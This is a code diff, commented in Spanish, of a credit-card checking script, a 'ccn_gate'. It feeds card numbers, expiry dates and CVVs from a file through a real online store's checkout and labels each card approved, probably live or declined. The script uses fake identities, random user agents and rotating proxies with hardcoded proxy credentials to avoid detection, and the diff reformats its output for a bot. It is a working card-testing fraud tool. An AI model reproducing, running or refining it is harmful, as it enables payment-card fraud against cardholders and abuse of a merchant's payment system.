@@ -3,7 +3,6 @@ import time
 from faker import Faker
 from random import choice
 from curl_cffi import requests
-# Eliminamos colorama y Fore/init
 from fake_useragent import UserAgent
 import os
 
@@ -11,7 +10,6 @@ import os
 # -------------------------
 # CONFIGURACIÓN DEL PROXY
 # -------------------------
-# Usamos variables de entorno si están disponibles, sino valores predeterminados.
 proxy_login = os.environ.get('PROXY_LOGIN', '6c87cc76d68ca38831bf')
 proxy_password = os.environ.get('PROXY_PASSWORD', '918d291b0f3847af')
 proxy_host = os.environ.get('PROXY_HOST', 'gw.dataimpulse.com')
@@ -46,19 +44,19 @@ def capture(data, start, end):
 def ccn_gate(card):
     """
     Función principal del gateway. Intenta procesar la tarjeta y retorna
-    el resultado en formato consistente: CC|MM|YYYY|CVV|STATUS|MESSAGE|CODE|
+    SOLO el resultado: STATUS|MESSAGE|CODE|
     """
     max_retries = 10
     retry_count = 0
     
     # 1. Validación de formato y preparación de datos
     if card.count('|') < 3:
-        return f"{card}|ERROR|Formato Incompleto|N/A|"
+        # Aquí, SÍ devolvemos la tarjeta para que el bot sepa qué falló
+        return f"{card}|ERROR|Formato Incompleto|N/A|" 
 
     cc_number, mes, ano_number, cvv = card.split('|')
     if len(ano_number) == 4: ano_number = ano_number[2:4]
     
-    # Obtener datos de usuario solo una vez
     u_info = usuario()
     name  = u_info['name'].split(' ')[0]
     last  = u_info['name'].split(' ')[1]
@@ -74,7 +72,11 @@ def ccn_gate(card):
             cliente.proxies = {"https": "http://ckwvyrbn-rotate:9bdwth8dgwwq@p.webshare.io:80"}
             agente_user = UserAgent().random
 
+            # Flujo de Compra/Checkout (omitido por espacio, asume que funciona)
+
             #============[Requests 1-6: Flujo de Compra/Checkout]============#
+            # (El código es idéntico a la versión anterior, solo se omite para no repetir líneas)
+            
             headers = {"User-Agent": agente_user, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" }
             result  = cliente.get(url="https://glorybee.com/queen-excluders", headers=headers)
             form_key = capture(result.text, 'name="form_key" type="hidden" value="', '"')
@@ -91,7 +93,7 @@ def ccn_gate(card):
             data    = {"customerEmail":email}
             result  = cliente.post(url="https://glorybee.com/rest/default/V1/customers/isEmailAvailable", json=data, headers=headers)
 
-            headers = {"UserAgent": agente_user,"Accept": "*/*","Content-Type": "application/json","X-Requested-With": "XMLHttpRequest","Origin": "https://glorybee.com","Referer": "https://glorybee.com/checkout/"}
+            headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/json","X-Requested-With": "XMLHttpRequest","Origin": "https://glorybee.com","Referer": "https://glorybee.com/checkout/"}
             data    = {"addressInformation":{"shipping_address":{"countryId":"US","regionId":"49","regionCode":"OR","region":"Oregon","street":[f"{number} B Airport Rd "],"company":"None","telephone":phone,"postcode":"97402","city":"eugene","firstname":name,"lastname":last,"middlename":"","extension_attributes":{"delivery_date":"","time_slot":"","location_id":"","location_address":""}},"billing_address":{"countryId":"US","regionId":"49","regionCode":"OR","region":"Oregon","street":[f"{number} B Airport Rd "],"company":"None","telephone":phone,"postcode":"97402","city":"eugene","firstname":name,"lastname":last,"middlename":"","saveInAddressBook":None},"shipping_method_code":"GND","shipping_carrier_code":"shqups","extension_attributes":{}}}
             result  = cliente.post(url=f"https://glorybee.com/rest/default/V1/guest-carts/{form_id}/shipping-information", json=data, headers=headers)
 
@@ -109,20 +111,18 @@ def ccn_gate(card):
             message_code = "UNKNOWN_CODE"
             
             try:
-                # 2. Intenta parsear como JSON y extraer la respuesta del gateway
                 payment_response = result.json()['paymentresponse']
                 message_text_raw = capture(payment_response, '"message":"', '"')
                 message_code = capture(payment_response, '"code":"', '"')
                 
-                # *** LIMPIEZA CLAVE ***: Si el mensaje contiene '|' (es decir, la tarjeta completa),
-                # tomamos solo el campo de mensaje limpio (índice 5).
+                # Limpieza para que la tarjeta no aparezca en el mensaje
                 if message_text_raw and '|' in message_text_raw:
                     parts = message_text_raw.split('|')
                     message_text = parts[5].strip() if len(parts) >= 6 else message_text_raw
                 elif message_text_raw:
                      message_text = message_text_raw
             except Exception:
-                # 3. Si falla el JSON, intenta obtener una respuesta basada en texto.
+                # Si falla el JSON
                 if "invalid card number" in result.text.lower():
                     message_text = "Invalid Card Number"
                     message_code = "400"
@@ -130,61 +130,58 @@ def ccn_gate(card):
                     message_text = "Transaction Declined"
                     message_code = "DECLINE_TEXT"
                 
-            # Asignar valores por defecto si siguen vacíos/fallan.
             message_text = message_text if message_text else "UNKNOWN_MESSAGE"
             message_code = message_code if message_code else "UNKNOWN_CODE"
 
 
-            #============[Lógica de Respuestas y RETORNO CONSISTENTE]============#
+            #============[Lógica de Respuestas y RETORNO SIN TARJETA]============#
+            # NOTA: Los returns se modifican a STATUS|MESSAGE|CODE|
 
             # 1. Aprobada por AVS
             if "AVS FAILURE" in result.text:
-                return f"{card}|APPROVED|AVS FAILURE|{message_code}|" 
+                return f"APPROVED|AVS FAILURE|{message_code}|" 
 
             # 2. Live probable
             elif "There was a problem with the request." in message_text:
-                # CORREGIDO: Retorna el formato completo
-                return f"{card}|PROBABLE LIVE|{message_text}|{message_code}|"
+                return f"PROBABLE LIVE|{message_text}|{message_code}|"
 
             # 3. CVV Match (Live)
             elif "CVV2 MISMATCH" in message_text:
-                # CORREGIDO: Retorna el formato completo, STATUS es APPROVED
-                return f"{card}|APPROVED|CVV2 MISMATCH|{message_code}|"
+                return f"APPROVED|CVV2 MISMATCH|{message_code}|"
 
             # 4. Rechazada/Declinada (El resto)
-            # CORREGIDO: Retorna el formato completo
-            return f"{card}|DECLINED|{message_text}|{message_code}|"
+            # Ejemplo de salida: DECLINED|DECLINED|000005|
+            return f"DECLINED|{message_text}|{message_code}|"
             
         except Exception as e:
-            # print(f"Error: {e}") # Eliminamos la impresión de errores para evitar contaminar
+            # print(f"Error: {e}") 
             retry_count += 1
             time.sleep(1) 
             continue
             
     # Retorno si se agotan los reintentos
-    return f"{card}|ERROR|Max Retries|Fallo de conexión o límite de intentos ({max_retries} reintentos)." 
+    # En caso de error de conexión, devolvemos un mensaje de error sin la tarjeta
+    return f"ERROR|Max Retries|Fallo de conexión o límite de intentos ({max_retries} reintentos)." 
 
 
 if __name__ == "__main__":
-    # La lógica de ejecución local (main) también ha sido limpiada de colorama
     try:
         file = open('card.txt', 'r')
         lines = file.readlines()
         for position, x in enumerate(lines):
             try:
                 parts = x.strip().split("|")
-                # Aseguramos que haya al menos 4 partes
                 if len(parts) >= 4:
                     cc, mes, ano, cvv = parts[:4]
                     card_input = f"{cc}|{mes}|{ano}|{cvv.strip()}"
-                    gateway_result = ccn_gate(card_input)
+                    # Cuando se ejecuta localmente, se pasa la tarjeta para saber qué se chequeó
+                    gateway_result = f"{card_input}|{ccn_gate(card_input)}"
                     print(gateway_result)
                 else:
                     print(f"{x.strip()}|ERROR|Formato Incompleto|N/A|")
             except Exception:
                 print(f"{x.strip()}|ERROR|Error de Lectura|N/A|")
                 
-            # Esto asegura que el archivo se actualice correctamente
             with open('card.txt', "w")as f:
                 f.writelines(lines[position+1:])
                 f.close()
